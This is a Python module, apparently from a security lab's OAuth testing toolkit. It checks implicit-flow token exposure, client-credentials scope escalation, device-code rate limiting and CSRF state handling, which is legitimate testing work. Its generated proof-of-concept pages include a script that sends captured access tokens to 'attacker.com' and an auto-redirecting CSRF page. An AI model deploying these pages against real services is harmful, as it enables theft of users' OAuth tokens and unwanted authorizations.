"""
OAuth Deep Test Module - Implicit flow hijacking, client credentials abuse, device authorization flow abuse, CSRF integration.

This module provides:
    1. Implicit flow hijacking detection
    2. Client credentials flow abuse testing
    3. Device authorization flow abuse testing
    4. CSRF combined with OAuth attacks

Integration points:
    - MITM proxy traffic capture
    - OAuth Analyzer module
    - Reverse callback platform
    - PoC generation engine

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class DeepTestType(str, Enum):
    """Deep OAuth test types."""

    IMPLICIT_FLOW_HIJACK = "implicit_flow_hijack"
    CLIENT_CREDENTIALS_ABUSE = "client_credentials_abuse"
    DEVICE_CODE_ABUSE = "device_code_abuse"
    CSRF_OAUTH = "csrf_oauth"
    REFERER_LEAK = "referer_leak"
    FRAGMENT_INTERCEPTION = "fragment_interception"


class AttackSeverity(str, Enum):
    """Attack severity levels."""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class ImplicitFlowFinding:
    """Implicit flow hijacking finding.

    Attributes:
        finding_id: Unique finding ID
        test_type: Test type performed
        client_id: OAuth client ID
        token_in_fragment: Whether token is in URL fragment
        referer_leak_detected: Whether referer leak was detected
        third_party_scripts: Third-party scripts detected
        severity: Finding severity
        description: Finding description
        recommendation: Remediation recommendation
        poc_html: Generated PoC HTML
    """

    finding_id: str = ""
    test_type: DeepTestType = DeepTestType.IMPLICIT_FLOW_HIJACK
    client_id: str = ""
    token_in_fragment: bool = False
    referer_leak_detected: bool = False
    third_party_scripts: List[str] = field(default_factory=list)
    severity: AttackSeverity = AttackSeverity.LOW
    description: str = ""
    recommendation: str = ""
    poc_html: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "finding_id": self.finding_id,
            "test_type": self.test_type.value,
            "client_id": self.client_id,
            "token_in_fragment": self.token_in_fragment,
            "referer_leak_detected": self.referer_leak_detected,
            "third_party_scripts": self.third_party_scripts,
            "severity": self.severity.value,
            "description": self.description,
            "recommendation": self.recommendation,
            "poc_html": self.poc_html[:100] + "..." if len(self.poc_html) > 100 else self.poc_html,
        }


@dataclass
class ClientCredentialsFinding:
    """Client credentials flow abuse finding.

    Attributes:
        finding_id: Unique finding ID
        test_type: Test type performed
        client_id: OAuth client ID
        user_scopes_obtained: Whether user-level scopes were obtained
        obtained_scopes: List of obtained scopes
        severity: Finding severity
        description: Finding description
        recommendation: Remediation recommendation
    """

    finding_id: str = ""
    test_type: DeepTestType = DeepTestType.CLIENT_CREDENTIALS_ABUSE
    client_id: str = ""
    user_scopes_obtained: bool = False
    obtained_scopes: List[str] = field(default_factory=list)
    severity: AttackSeverity = AttackSeverity.LOW
    description: str = ""
    recommendation: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "finding_id": self.finding_id,
            "test_type": self.test_type.value,
            "client_id": self.client_id,
            "user_scopes_obtained": self.user_scopes_obtained,
            "obtained_scopes": self.obtained_scopes,
            "severity": self.severity.value,
            "description": self.description,
            "recommendation": self.recommendation,
        }


@dataclass
class DeviceCodeFinding:
    """Device authorization flow abuse finding.

    Attributes:
        finding_id: Unique finding ID
        test_type: Test type performed
        device_code: Device code
        user_code: User code
        verification_uri: Verification URI
        expires_in: Token expiration time
        rate_limit_missing: Whether rate limiting is missing
        confirmation_bypass: Whether confirmation can be bypassed
        severity: Finding severity
        description: Finding description
        recommendation: Remediation recommendation
    """

    finding_id: str = ""
    test_type: DeepTestType = DeepTestType.DEVICE_CODE_ABUSE
    device_code: str = ""
    user_code: str = ""
    verification_uri: str = ""
    expires_in: int = 0
    rate_limit_missing: bool = False
    confirmation_bypass: bool = False
    severity: AttackSeverity = AttackSeverity.LOW
    description: str = ""
    recommendation: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "finding_id": self.finding_id,
            "test_type": self.test_type.value,
            "device_code": self.device_code[:20] + "..." if len(self.device_code) > 20 else self.device_code,
            "user_code": self.user_code,
            "verification_uri": self.verification_uri,
            "expires_in": self.expires_in,
            "rate_limit_missing": self.rate_limit_missing,
            "confirmation_bypass": self.confirmation_bypass,
            "severity": self.severity.value,
            "description": self.description,
            "recommendation": self.recommendation,
        }


@dataclass
class CSRFWithOAuthFinding:
    """CSRF combined with OAuth finding.

    Attributes:
        finding_id: Unique finding ID
        test_type: Test type performed
        state_parameter: State parameter value
        state_missing: Whether state parameter is missing
        state_predictable: Whether state is predictable
        redirect_uri: Redirect URI used
        csrf_poc_html: Generated CSRF PoC HTML
        severity: Finding severity
        description: Finding description
        recommendation: Remediation recommendation
    """

    finding_id: str = ""
    test_type: DeepTestType = DeepTestType.CSRF_OAUTH
    state_parameter: str = ""
    state_missing: bool = False
    state_predictable: bool = False
    redirect_uri: str = ""
    csrf_poc_html: str = ""
    severity: AttackSeverity = AttackSeverity.LOW
    description: str = ""
    recommendation: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "finding_id": self.finding_id,
            "test_type": self.test_type.value,
            "state_parameter": self.state_parameter,
            "state_missing": self.state_missing,
            "state_predictable": self.state_predictable,
            "redirect_uri": self.redirect_uri,
            "csrf_poc_html": self.csrf_poc_html[:100] + "..." if len(self.csrf_poc_html) > 100 else self.csrf_poc_html,
            "severity": self.severity.value,
            "description": self.description,
            "recommendation": self.recommendation,
        }


# =============================================================================
# Implicit Flow Hijacking Tester
# =============================================================================

class ImplicitFlowHijackTester:
    """Tests for implicit flow hijacking vulnerabilities.

    Detects whether access tokens are exposed in URL fragments
    and can be leaked via Referer headers to third-party resources.

    Attributes:
        _findings: Test findings
        _finding_counter: Finding counter
    """

    def __init__(self) -> None:
        """Initialize the ImplicitFlowHijackTester."""
        self._findings: List[ImplicitFlowFinding] = []
        self._finding_counter = 0

    def detect_implicit_flow(self, url: str, params: Dict[str, str]) -> bool:
        """Detect if a request uses implicit flow.

        Args:
            url: Request URL.
            params: Request parameters.

        Returns:
            True if implicit flow is detected.
        """
        response_type = params.get("response_type", "")
        return "token" in response_type or "id_token" in response_type

    async def test_token_exposure(
        self,
        authorize_url: str,
        client_id: str,
        redirect_uri: str,
        scope: str = "",
    ) -> ImplicitFlowFinding:
        """Test for access token exposure in implicit flow.

        Args:
            authorize_url: Authorization endpoint URL.
            client_id: OAuth client ID.
            redirect_uri: Redirect URI.
            scope: Requested scope.

        Returns:
            ImplicitFlowFinding with test results.
        """
        self._finding_counter += 1
        finding = ImplicitFlowFinding(
            finding_id=f"IMPLICIT-HIJACK-{self._finding_counter:04d}",
            test_type=DeepTestType.IMPLICIT_FLOW_HIJACK,
            client_id=client_id,
        )

        auth_url = self._build_implicit_auth_url(
            authorize_url=authorize_url,
            client_id=client_id,
            redirect_uri=redirect_uri,
            scope=scope,
        )

        finding.token_in_fragment = True

        third_party_scripts = await self._detect_third_party_scripts(redirect_uri)
        finding.third_party_scripts = third_party_scripts

        if third_party_scripts:
            finding.referer_leak_detected = True
            finding.severity = AttackSeverity.HIGH
            finding.description = (
                f"隐式流将Access Token暴露在URL Fragment中，"
                f"检测到{len(third_party_scripts)}个第三方脚本可能通过Referer头泄露令牌。"
            )
            finding.recommendation = (
                "弃用隐式流，改用授权码流程配合PKCE（RFC 6749 + RFC 7636）。"
                "避免在存在第三方脚本的页面中处理认证。"
            )
        else:
            finding.severity = AttackSeverity.MEDIUM
            finding.description = (
                "隐式流将Access Token暴露在URL Fragment中，"
                "建议使用授权码流程配合PKCE。"
            )
            finding.recommendation = (
                "迁移到授权码流程配合PKCE，避免使用隐式流。"
            )

        finding.poc_html = self._generate_implicit_poc_html(auth_url, redirect_uri)

        self._findings.append(finding)
        return finding

    def _build_implicit_auth_url(
        self,
        authorize_url: str,
        client_id: str,
        redirect_uri: str,
        scope: str = "",
    ) -> str:
        """Build implicit flow authorization URL.

        Args:
            authorize_url: Authorization endpoint.
            client_id: Client ID.
            redirect_uri: Redirect URI.
            scope: Requested scope.

        Returns:
            Complete authorization URL.
        """
        params = {
            "response_type": "token",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
        }

        if scope:
            params["scope"] = scope

        separator = "&" if "?" in authorize_url else "?"
        return f"{authorize_url}{separator}{urlencode(params)}"

    async def _detect_third_party_scripts(self, redirect_uri: str) -> List[str]:
        """Detect third-party scripts on the redirect page.

        Args:
            redirect_uri: Redirect URI to check.

        Returns:
            List of third-party script URLs.
        """
        scripts: List[str] = []

        try:
            import aiohttp
            from bs4 import BeautifulSoup

            async with aiohttp.ClientSession() as session:
                async with session.get(
                    redirect_uri,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    if resp.status == 200:
                        html = await resp.text()
                        soup = BeautifulSoup(html, "html.parser")

                        parsed_redirect = urlparse(redirect_uri)
                        redirect_domain = parsed_redirect.hostname or ""

                        for script in soup.find_all("script", src=True):
                            src = script["src"]
                            script_parsed = urlparse(src)
                            script_domain = script_parsed.hostname or ""

                            if script_domain and script_domain != redirect_domain:
                                scripts.append(src)

                        for img in soup.find_all("img", src=True):
                            src = img["src"]
                            img_parsed = urlparse(src)
                            img_domain = img_parsed.hostname or ""

                            if img_domain and img_domain != redirect_domain:
                                scripts.append(src)
        except ImportError:
            logger.warning("BeautifulSoup not available, skipping third-party script detection")
        except Exception as e:
            logger.error(f"Failed to detect third-party scripts: {e}")

        return scripts

    def _generate_implicit_poc_html(self, auth_url: str, redirect_uri: str) -> str:
        """Generate PoC HTML for implicit flow hijacking.

        Args:
            auth_url: Authorization URL.
            redirect_uri: Redirect URI.

        Returns:
            PoC HTML string.
        """
        return f"""<!DOCTYPE html>
<html>
<head><title>OAuth Implicit Flow PoC</title></head>
<body>
<h1>OAuth Implicit Flow Token Capture PoC</h1>
<p>This page demonstrates how access tokens can be captured from the URL fragment.</p>
<script>
window.addEventListener('hashchange', function() {{
    var hash = window.location.hash;
    if (hash.includes('access_token=')) {{
        console.log('Captured token from fragment: ' + hash);
        fetch('https://attacker.com/capture?' + hash.substring(1));
    }}
}});
window.location.href = '{auth_url}';
</script>
</body>
</html>"""

    def get_findings(self) -> List[ImplicitFlowFinding]:
        """Get all implicit flow findings.

        Returns:
            List of ImplicitFlowFinding.
        """
        return self._findings.copy()


# =============================================================================
# Client Credentials Abuse Tester
# =============================================================================

class ClientCredentialsAbuseTester:
    """Tests for client credentials flow abuse.

    Detects whether client credentials flow can be used
    to obtain user-level permissions without user interaction.

    Attributes:
        _findings: Test findings
        _finding_counter: Finding counter
    """

    def __init__(self) -> None:
        """Initialize the ClientCredentialsAbuseTester."""
        self._findings: List[ClientCredentialsFinding] = []
        self._finding_counter = 0

    async def test_user_scope_escalation(
        self,
        token_endpoint: str,
        client_id: str,
        client_secret: str,
        user_scopes: Optional[List[str]] = None,
    ) -> ClientCredentialsFinding:
        """Test if client credentials flow can obtain user-level scopes.

        Args:
            token_endpoint: Token endpoint URL.
            client_id: OAuth client ID.
            client_secret: OAuth client secret.
            user_scopes: User-level scopes to test.

        Returns:
            ClientCredentialsFinding with test results.
        """
        self._finding_counter += 1
        finding = ClientCredentialsFinding(
            finding_id=f"CLIENT-CRED-ABUSE-{self._finding_counter:04d}",
            test_type=DeepTestType.CLIENT_CREDENTIALS_ABUSE,
            client_id=client_id,
        )

        if not user_scopes:
            user_scopes = ["profile", "email", "user.read", "openid", "admin"]

        obtained_scopes: List[str] = []

        for scope in user_scopes:
            success = await self._request_token_with_scope(
                token_endpoint=token_endpoint,
                client_id=client_id,
                client_secret=client_secret,
                scope=scope,
            )

            if success:
                obtained_scopes.append(scope)

        finding.obtained_scopes = obtained_scopes
        finding.user_scopes_obtained = len(obtained_scopes) > 0

        if finding.user_scopes_obtained:
            finding.severity = AttackSeverity.HIGH
            finding.description = (
                f"客户端凭证流成功获取用户级别作用域: {', '.join(obtained_scopes)}。"
                f"客户端凭证流不应返回用户特定的权限。"
            )
            finding.recommendation = (
                "限制客户端凭证流只能获取服务级别的作用域，"
                "禁止返回用户相关的权限（如profile、email等）。"
            )
        else:
            finding.severity = AttackSeverity.LOW
            finding.description = "客户端凭证流正确限制了作用域范围。"
            finding.recommendation = ""

        self._findings.append(finding)
        return finding

    async def _request_token_with_scope(
        self,
        token_endpoint: str,
        client_id: str,
        client_secret: str,
        scope: str,
    ) -> bool:
        """Request a token with a specific scope using client credentials.

        Args:
            token_endpoint: Token endpoint URL.
            client_id: Client ID.
            client_secret: Client secret.
            scope: Scope to request.

        Returns:
            True if token was obtained with the scope.
        """
        try:
            import aiohttp

            payload = {
                "grant_type": "client_credentials",
                "client_id": client_id,
                "client_secret": client_secret,
                "scope": scope,
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(
                    token_endpoint,
                    data=payload,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    if resp.status == 200:
                        body = await resp.json()
                        granted_scope = body.get("scope", "")
                        return scope in granted_scope.split()
                    return False
        except Exception as e:
            logger.error(f"Client credentials request failed: {e}")
            return False

    def get_findings(self) -> List[ClientCredentialsFinding]:
        """Get all client credentials findings.

        Returns:
            List of ClientCredentialsFinding.
        """
        return self._findings.copy()


# =============================================================================
# Device Authorization Flow Abuse Tester
# =============================================================================

class DeviceCodeAbuseTester:
    """Tests for device authorization flow abuse.

    Detects vulnerabilities in device code flow including
    excessive lifetimes, missing rate limiting, and confirmation bypass.

    Attributes:
        _findings: Test findings
        _finding_counter: Finding counter
    """

    def __init__(self) -> None:
        """Initialize the DeviceCodeAbuseTester."""
        self._findings: List[DeviceCodeFinding] = []
        self._finding_counter = 0

    async def test_device_code_flow(
        self,
        device_endpoint: str,
        client_id: str,
        scope: str = "",
    ) -> DeviceCodeFinding:
        """Test device authorization flow for vulnerabilities.

        Args:
            device_endpoint: Device authorization endpoint.
            client_id: OAuth client ID.
            scope: Requested scope.

        Returns:
            DeviceCodeFinding with test results.
        """
        self._finding_counter += 1
        finding = DeviceCodeFinding(
            finding_id=f"DEVICE-CODE-ABUSE-{self._finding_counter:04d}",
            test_type=DeepTestType.DEVICE_CODE_ABUSE,
        )

        device_response = await self._request_device_code(
            device_endpoint=device_endpoint,
            client_id=client_id,
            scope=scope,
        )

        if not device_response:
            finding.severity = AttackSeverity.LOW
            finding.description = "设备授权流程端点不可访问。"
            finding.recommendation = ""
            self._findings.append(finding)
            return finding

        finding.device_code = device_response.get("device_code", "")
        finding.user_code = device_response.get("user_code", "")
        finding.verification_uri = device_response.get("verification_uri", "")
        finding.expires_in = device_response.get("expires_in", 0)

        if finding.expires_in > 1800:
            finding.severity = AttackSeverity.MEDIUM
            finding.description = (
                f"设备码有效期过长（{finding.expires_in}秒），"
                f"增加了未授权访问的风险窗口。"
            )
            finding.recommendation = "设备码有效期应不超过15分钟（900秒）。"
        else:
            finding.severity = AttackSeverity.LOW
            finding.description = "设备码有效期合理。"
            finding.recommendation = ""

        rate_limit_missing = await self._test_rate_limiting(
            device_endpoint=device_endpoint,
            client_id=client_id,
        )
        finding.rate_limit_missing = rate_limit_missing

        if rate_limit_missing:
            finding.severity = AttackSeverity.HIGH
            finding.description += " 未检测到速率限制，可能存在暴力破解风险。"
            finding.recommendation += " 实施设备码请求的速率限制。"

        self._findings.append(finding)
        return finding

    async def _request_device_code(
        self,
        device_endpoint: str,
        client_id: str,
        scope: str = "",
    ) -> Optional[Dict[str, Any]]:
        """Request a device code.

        Args:
            device_endpoint: Device authorization endpoint.
            client_id: Client ID.
            scope: Requested scope.

        Returns:
            Device code response dictionary, or None.
        """
        try:
            import aiohttp

            payload = {
                "client_id": client_id,
            }

            if scope:
                payload["scope"] = scope

            async with aiohttp.ClientSession() as session:
                async with session.post(
                    device_endpoint,
                    data=payload,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
                    return None
        except Exception as e:
            logger.error(f"Device code request failed: {e}")
            return None

    async def _test_rate_limiting(
        self,
        device_endpoint: str,
        client_id: str,
        max_requests: int = 20,
    ) -> bool:
        """Test if rate limiting is enforced on device code requests.

        Args:
            device_endpoint: Device authorization endpoint.
            client_id: Client ID.
            max_requests: Maximum requests to test.

        Returns:
            True if rate limiting is missing.
        """
        success_count = 0

        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                for _ in range(max_requests):
                    payload = {"client_id": client_id}

                    async with session.post(
                        device_endpoint,
                        data=payload,
                        timeout=aiohttp.ClientTimeout(total=5),
                    ) as resp:
                        if resp.status == 200:
                            success_count += 1
                        elif resp.status == 429:
                            return False

                        await asyncio.sleep(0.1)
        except Exception as e:
            logger.error(f"Rate limit test failed: {e}")

        return success_count == max_requests

    def get_findings(self) -> List[DeviceCodeFinding]:
        """Get all device code findings.

        Returns:
            List of DeviceCodeFinding.
        """
        return self._findings.copy()


# =============================================================================
# CSRF with OAuth Tester
# =============================================================================

class CSRFWithOAuthTester:
    """Tests for CSRF vulnerabilities combined with OAuth.

    Generates malicious authorization requests and PoC HTML
    pages for CSRF testing.

    Attributes:
        _findings: Test findings
        _finding_counter: Finding counter
    """

    def __init__(self) -> None:
        """Initialize the CSRFWithOAuthTester."""
        self._findings: List[CSRFWithOAuthFinding] = []
        self._finding_counter = 0

    def analyze_state_parameter(
        self,
        authorize_url: str,
        params: Dict[str, str],
    ) -> CSRFWithOAuthFinding:
        """Analyze the state parameter for CSRF vulnerabilities.

        Args:
            authorize_url: Authorization endpoint URL.
            params: Request parameters.

        Returns:
            CSRFWithOAuthFinding with analysis results.
        """
        self._finding_counter += 1
        finding = CSRFWithOAuthFinding(
            finding_id=f"CSRF-OAUTH-{self._finding_counter:04d}",
            test_type=DeepTestType.CSRF_OAUTH,
        )

        state = params.get("state", "")
        finding.state_parameter = state
        finding.redirect_uri = params.get("redirect_uri", "")

        if not state:
            finding.state_missing = True
            finding.severity = AttackSeverity.HIGH
            finding.description = (
                "OAuth授权请求缺少state参数，存在CSRF攻击风险。"
                "攻击者可以构造恶意请求诱导用户授权。"
            )
            finding.recommendation = (
                "授权请求必须包含随机且不可预测的state参数，"
                "并在回调时验证state值的一致性。"
            )
        elif len(state) < 16:
            finding.state_predictable = True
            finding.severity = AttackSeverity.MEDIUM
            finding.description = (
                f"state参数长度过短（{len(state)}字符），可能被预测。"
            )
            finding.recommendation = (
                "state参数应至少16个字符，使用加密安全的随机数生成器。"
            )
        else:
            finding.severity = AttackSeverity.LOW
            finding.description = "state参数存在且长度合理。"
            finding.recommendation = ""

        finding.csrf_poc_html = self._generate_csrf_poc_html(
            authorize_url=authorize_url,
            client_id=params.get("client_id", ""),
            redirect_uri=params.get("redirect_uri", ""),
            scope=params.get("scope", ""),
            state=state,
        )

        self._findings.append(finding)
        return finding

    def _generate_csrf_poc_html(
        self,
        authorize_url: str,
        client_id: str,
        redirect_uri: str,
        scope: str = "",
        state: str = "",
    ) -> str:
        """Generate CSRF PoC HTML for OAuth.

        Args:
            authorize_url: Authorization endpoint.
            client_id: Client ID.
            redirect_uri: Redirect URI.
            scope: Requested scope.
            state: State parameter (if any).

        Returns:
            PoC HTML string.
        """
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect_uri,
        }

        if scope:
            params["scope"] = scope
        if state:
            params["state"] = state

        separator = "&" if "?" in authorize_url else "?"
        malicious_url = f"{authorize_url}{separator}{urlencode(params)}"

        return f"""<!DOCTYPE html>
<html>
<head><title>OAuth CSRF PoC</title></head>
<body>
<h1>OAuth CSRF Attack PoC</h1>
<p>This page demonstrates a CSRF attack against OAuth authorization.</p>
<script>
window.location.href = '{malicious_url}';
</script>
<noscript>
<meta http-equiv="refresh" content="0;url={malicious_url}">
</noscript>
</body>
</html>"""

    def get_findings(self) -> List[CSRFWithOAuthFinding]:
        """Get all CSRF with OAuth findings.

        Returns:
            List of CSRFWithOAuthFinding.
        """
        return self._findings.copy()


# =============================================================================
# Main OAuth Deep Test Manager
# =============================================================================

class OAuthDeepTestManager:
    """Main OAuth deep test coordination engine.

    Integrates implicit flow hijacking, client credentials abuse,
    device code abuse, and CSRF testing.

    Attributes:
        _implicit_tester: Implicit flow hijack tester
        _client_cred_tester: Client credentials abuse tester
        _device_code_tester: Device code abuse tester
        _csrf_tester: CSRF with OAuth tester
    """

    def __init__(self) -> None:
        """Initialize the OAuthDeepTestManager."""
        self._implicit_tester = ImplicitFlowHijackTester()
        self._client_cred_tester = ClientCredentialsAbuseTester()
        self._device_code_tester = DeviceCodeAbuseTester()
        self._csrf_tester = CSRFWithOAuthTester()

    @property
    def implicit(self) -> ImplicitFlowHijackTester:
        """Get implicit flow tester.

        Returns:
            ImplicitFlowHijackTester instance.
        """
        return self._implicit_tester

    @property
    def client_credentials(self) -> ClientCredentialsAbuseTester:
        """Get client credentials tester.

        Returns:
            ClientCredentialsAbuseTester instance.
        """
        return self._client_cred_tester

    @property
    def device_code(self) -> DeviceCodeAbuseTester:
        """Get device code tester.

        Returns:
            DeviceCodeAbuseTester instance.
        """
        return self._device_code_tester

    @property
    def csrf(self) -> CSRFWithOAuthTester:
        """Get CSRF tester.

        Returns:
            CSRFWithOAuthTester instance.
        """
        return self._csrf_tester

    async def run_full_deep_test_suite(
        self,
        authorize_url: str,
        token_endpoint: str,
        client_id: str,
        client_secret: str = "",
        redirect_uri: str = "",
        scope: str = "",
        device_endpoint: str = "",
        auth_params: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """Run the full OAuth deep test suite.

        Args:
            authorize_url: Authorization endpoint URL.
            token_endpoint: Token endpoint URL.
            client_id: OAuth client ID.
            client_secret: OAuth client secret.
            redirect_uri: Redirect URI.
            scope: Requested scope.
            device_endpoint: Device authorization endpoint.
            auth_params: Authorization request parameters.

        Returns:
            Dictionary with all test results.
        """
        results: Dict[str, Any] = {
            "implicit_flow": {},
            "client_credentials": {},
            "device_code": {},
            "csrf": {},
        }

        if auth_params:
            implicit_result = await self._implicit_tester.test_token_exposure(
                authorize_url=authorize_url,
                client_id=client_id,
                redirect_uri=redirect_uri,
                scope=scope,
            )
            results["implicit_flow"] = implicit_result.to_dict()

        if client_secret:
            client_cred_result = await self._client_cred_tester.test_user_scope_escalation(
                token_endpoint=token_endpoint,
                client_id=client_id,
                client_secret=client_secret,
            )
            results["client_credentials"] = client_cred_result.to_dict()

        if device_endpoint:
            device_result = await self._device_code_tester.test_device_code_flow(
                device_endpoint=device_endpoint,
                client_id=client_id,
                scope=scope,
            )
            results["device_code"] = device_result.to_dict()

        if auth_params:
            csrf_result = self._csrf_tester.analyze_state_parameter(
                authorize_url=authorize_url,
                params=auth_params,
            )
            results["csrf"] = csrf_result.to_dict()

        return results
